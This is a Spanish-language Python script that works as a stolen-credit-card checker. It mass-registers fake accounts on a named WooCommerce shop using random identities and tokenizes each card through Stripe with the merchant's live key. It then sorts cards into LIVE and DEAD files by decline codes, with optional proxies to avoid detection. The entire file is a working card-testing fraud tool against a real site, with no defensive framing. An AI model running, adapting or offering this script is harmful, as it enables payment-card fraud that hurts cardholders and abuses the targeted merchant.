import requests
from bs4 import BeautifulSoup
import os
import json

# Cargar configuración de proxies desde archivo externo
def cargar_configuracion():
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
            return config.get('proxy_config', {})
    except (FileNotFoundError, json.JSONDecodeError):
        print("Archivo config.json no encontrado o inválido. Usando configuración sin proxies.")
        return {}

# Crear archivos si no existen
def inicializar_archivos():
    if not os.path.exists("CARDS.txt"):
        with open("CARDS.txt", "w") as f:
            f.write("# Agrega las tarjetas aquí en formato CC|MM|AA|CVV (una por línea)\n")
    if not os.path.exists("LIVE.txt"):
        with open("LIVE.txt", "w") as f:
            f.write("# Tarjetas válidas\n")
    if not os.path.exists("DEAD.txt"):
        with open("DEAD.txt", "w") as f:
            f.write("# Tarjetas inválidas\n")

inicializar_archivos()
proxy_config = cargar_configuracion()

def procesar_tarjeta(tarjeta_input, usar_proxy=False):
    try:
        # Divide los datos
        cc, mes, ano, cvv = tarjeta_input.split("|")

        # Validaciones
        if len(cc) < 13 or len(cc) > 19 or not cc.isdigit():
            raise ValueError("El número de tarjeta (CC) debe tener entre 13 y 19 dígitos.")
        if not mes.isdigit() or int(mes) < 1 or int(mes) > 12:
            raise ValueError("El mes (MES) debe ser un número entre 01 y 12.")
        if not ano.isdigit() or len(ano) not in [2, 4]:
            raise ValueError("El año (AÑO) debe tener 2 o 4 dígitos.")
        if len(ano) == 4:
            ano = ano[2:]  # Convierte 2025 -> 25
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            raise ValueError("El CVV debe tener 3 o 4 dígitos.")
            
    except ValueError as e:
        print(f"Error: {e}")
        return "INVALID"

    try:
        random_user_url = "https://randomuser.me/api/?results=1&nat=US"
        
        # Configurar sesión con o sin proxy
        session = requests.Session()
        if usar_proxy and proxy_config:
            session.proxies.update(proxy_config)
            print("Usando proxies configurados...")
        
        random_user_response = session.get(random_user_url)
        random_user_data = random_user_response.json()
        user_info = random_user_data["results"][0]
        email = user_info["email"]
        zipcode = user_info["location"]["postcode"]

        # URL de la página
        url = "https://www.scandictech.no/my-account/"

        # Datos del POST
        data = {
            "email": email,
            "wc_order_attribution_source_type": "referral",
            "wc_order_attribution_referrer": "https://web.telegram.org/",
            "wc_order_attribution_utm_campaign": "(none)",
            "wc_order_attribution_utm_source": "web.telegram.org",
            "wc_order_attribution_utm_medium": "referral",
            "wc_order_attribution_utm_content": "/",
            "wc_order_attribution_utm_id": "(none)",
            "wc_order_attribution_utm_term": "(none)",
            "wc_order_attribution_utm_source_platform": "(none)",
            "wc_order_attribution_utm_creative_format": "(none)",
            "wc_order_attribution_utm_marketing_tactic": "(none)",
            "wc_order_attribution_session_entry": "https://www.scandictech.no/",
            "wc_order_attribution_session_start_time": "2025-05-02 02:22:31",
            "wc_order_attribution_session_pages": "13",
            "wc_order_attribution_session_count": "1",
            "wc_order_attribution_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "woocommerce-register-nonce": "aef6c11c3b",
            "_wp_http_referer": "/my-account/",
            "register": "Register"
        }

        # Encabezados del POST
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.7",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.scandictech.no",
            "referer": "https://www.scandictech.no/my-account/",
            "sec-ch-ua": '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "sec-gpc": "1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
        }

        # Realizar el POST
        try:
            post_response = session.post(url, data=data, headers=headers)
        except requests.exceptions.RequestException as e:
            print(f"Error de conexión: {e}")
            return "DEAD"

        # Realizar el GET a https://www.scandictech.no/my-account/add-payment-method/
        add_payment_method_url = "https://www.scandictech.no/my-account/add-payment-method/"
        add_payment_method_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.7",
            "cache-control": "max-age=0",
            "priority": "u=0, i",
            "referer": "https://www.scandictech.no/my-account/",
            "sec-ch-ua": '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-gpc": "1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
        }

        try:
            response = session.get(add_payment_method_url, headers=add_payment_method_headers)
        except requests.exceptions.RequestException as e:
            print(f"Error de conexión: {e}")
            return "DEAD"

        # Extraer "createAndConfirmSetupIntentNonce" del HTML del response
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            scripts = soup.find_all("script")
            nonce = None
            for script in scripts:
                if script.string and "createAndConfirmSetupIntentNonce" in script.string:
                    start = script.string.find("createAndConfirmSetupIntentNonce") + len("createAndConfirmSetupIntentNonce") + 3
                    end = script.string.find('"', start)
                    nonce = script.string[start:end]
                    break

        # Realizar el POST a https://m.stripe.com/6
        stripe_url = "https://m.stripe.com/6"
        stripe_data = {}
        try:
            stripe_response = session.post(stripe_url, data=stripe_data, headers=headers)
        except requests.exceptions.RequestException as e:
            print(f"Error de conexión: {e}")
            return "DEAD"

        # Extraer GUID, MUID y SID
        stripe_json = stripe_response.json()
        guid = stripe_json.get("guid", "")
        muid = stripe_json.get("muid", "")
        sid = stripe_json.get("sid", "")

        # Realizar el POST a https://api.stripe.com/v1/payment_methods
        payment_methods_url = "https://api.stripe.com/v1/payment_methods"
        payment_methods_data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": ano,
            "card[exp_month]": mes,
            "allow_redisplay": "unspecified",
            "billing_details[address][postal_code]": zipcode,
            "billing_details[address][country]": "US",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/e01db0f08f; stripe-js-v3/e01db0f08f; payment-element; deferred-intent",
            "referrer": "https://www.scandictech.no",
            "time_on_page": "67182",
            "client_attribution_metadata[client_session_id]": "7cbca304-99b4-4e6f-a571-b689a496a462",
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": "pk_live_51CAQ12Ch1v99O5ajYxDe9RHvH4v7hfoutP2lmkpkGOwx5btDAO6HDrYStP95KmqkxZro2cUJs85TtFsTtB75aV2G00F87TR6yf",
            "_stripe_version": "2024-06-20",
        }

        payment_methods_headers = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.7",
            "content-length": "4498",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "priority": "u=1, i",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
        }

        try:
            payment_methods_response = session.post(payment_methods_url, data=payment_methods_data, headers=payment_methods_headers)
        except requests.exceptions.RequestException as e:
            print(f"Error de conexión: {e}")
            return "DEAD"

        # Extraer el "id" del response
        if payment_methods_response.status_code == 200:
            payment_methods_json = payment_methods_response.json()
            payment_method_id = payment_methods_json.get("id", "")

            # Realizar el POST final
            confirm_setup_intent_url = "https://www.scandictech.no/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            confirm_setup_intent_headers = {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.7",
                "content-length": "142",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.scandictech.no",
                "priority": "u=1, i",
                "referer": "https://www.scandictech.no/my-account/add-payment-method/",
                "sec-ch-ua": '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
                "x-requested-with": "XMLHttpRequest"
            }
            confirm_setup_intent_data = {
                "action": "create_and_confirm_setup_intent",
                "wc-stripe-payment-method": payment_method_id,
                "wc-stripe-payment-type": "card",
                "_ajax_nonce": nonce
            }
            try:
                confirm_setup_intent_response = session.post(confirm_setup_intent_url, data=confirm_setup_intent_data, headers=confirm_setup_intent_headers)
            except requests.exceptions.RequestException as e:
                print(f"Error de conexión: {e}")
                return "DEAD"

            response_json = confirm_setup_intent_response.json()

            if response_json.get("success") is False:
                error_message = response_json.get("data", {}).get("error", {}).get("message", "Unknown error")

                if "incorrect_address" in error_message:
                    print(f"{tarjeta_input} , STATUS : APPROVED AVS ✅ , MESSAGE : {error_message} ❌")
                    return "LIVE"
                elif "incorrect_cvc" in error_message:
                    print(f"{tarjeta_input} , STATUS : APPROVED CVV INCORRECT ✅ , MESSAGE : {error_message} ❌")
                    return "LIVE"
                elif "insufficient_funds" in error_message:
                    print(f"{tarjeta_input} , STATUS : APPROVED ✅ , MESSAGE : {error_message} ❌")
                    return "LIVE"
                else:
                    print(f"{tarjeta_input} , STATUS : DECLINED ❌ , MESSAGE : {error_message} ❌")
                    return "DEAD"

            elif response_json.get("success") is True:
                data = response_json.get("data", {})
                status = data.get("status", "unknown")

                if status == "requires_action":
                    print(f"{tarjeta_input} , STATUS : APPROVED 3D ✅ , MESSAGE : {status} ❌")
                    return "LIVE"
                else:
                    print(f"{tarjeta_input} , STATUS : APPROVED ✅ , MESSAGE : {status} ✅")
                    return "LIVE"
            else:
                print(f"{tarjeta_input} , STATUS : UNKNOWN ❌, MESSAGE : Respuesta inesperada del servidor.")
                return "DEAD"

    except Exception as e:
        print(f"Error al procesar la tarjeta {tarjeta_input}: {str(e)}")
        return "DEAD"

def mover_tarjeta(origen, destino, tarjeta):
    with open(origen, "r") as f:
        lineas = f.readlines()
    
    lineas_actualizadas = [linea for linea in lineas if linea.strip() != tarjeta.strip()]
    
    with open(origen, "w") as f:
        f.writelines(lineas_actualizadas)
    
    with open(destino, "a") as f:
        f.write(tarjeta + "\n")

def procesar_archivo_cards(usar_proxy=False):
    with open("CARDS.txt", "r") as f:
        tarjetas = [line.strip() for line in f.readlines() if line.strip() and not line.startswith("#")]
    
    for tarjeta in tarjetas:
        resultado = procesar_tarjeta(tarjeta, usar_proxy)
        if resultado == "LIVE":
            mover_tarjeta("CARDS.txt", "LIVE.txt", tarjeta)
        elif resultado == "DEAD":
            mover_tarjeta("CARDS.txt", "DEAD.txt", tarjeta)

# Menú principal
while True:
    print("""
SCRIPT DE VERIFICACIÓN DE TARJETAS
---------------------------------
1. Verificar tarjetas automáticamente desde CARDS.txt
2. Verificar una tarjeta manualmente
3. Salir
""")

    opcion = input("Seleccione una opción: ")

    if opcion == "1":
        print("\nIniciando verificación automática...")
        usar_proxy = input("¿Desea usar proxies? (s/n): ").lower() == 's'
        procesar_archivo_cards(usar_proxy)
        print("\nVerificación completada. Resultados:")
        print(f"- Tarjetas válidas guardadas en LIVE.txt")
        print(f"- Tarjetas inválidas guardadas en DEAD.txt")
        print(f"- Tarjetas pendientes quedan en CARDS.txt")

    elif opcion == "2":
        tarjeta_input = input("\nCC|MM|AA|CVV: ")
        usar_proxy = input("¿Desea usar proxies? (s/n): ").lower() == 's'
        resultado = procesar_tarjeta(tarjeta_input, usar_proxy)
        if resultado == "LIVE":
            with open("LIVE.txt", "a") as f:
                f.write(tarjeta_input + "\n")
            print("Tarjeta válida añadida a LIVE.txt")
        elif resultado == "DEAD":
            with open("DEAD.txt", "a") as f:
                f.write(tarjeta_input + "\n")
            print("Tarjeta inválida añadida a DEAD.txt")

    elif opcion == "3":
        print("Saliendo...")
        break

    else:
        print("Opción no válida. Intente nuevamente.")